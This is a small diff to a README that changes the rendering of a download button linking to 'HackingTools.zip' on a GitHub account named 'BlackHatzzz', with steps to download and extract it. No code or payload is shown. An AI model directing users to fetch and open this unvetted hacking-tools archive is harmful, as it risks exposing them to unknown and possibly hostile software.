@@ -62,7 +62,7 @@ Download the ZIP file
 
 Click here to download HackingTools.zip
 
-[![Download](assets/1751144151272.png)](https://github.com/BlackHatzzz/HackingTools/releases/download/HackingTools/HackingTools.zip)
+[<img src="assets/1751144151272.png" width="40"/>](https://github.com/BlackHatzzz/HackingTools/releases/download/HackingTools/HackingTools.zip)
 
 Extract the ZIP file
 
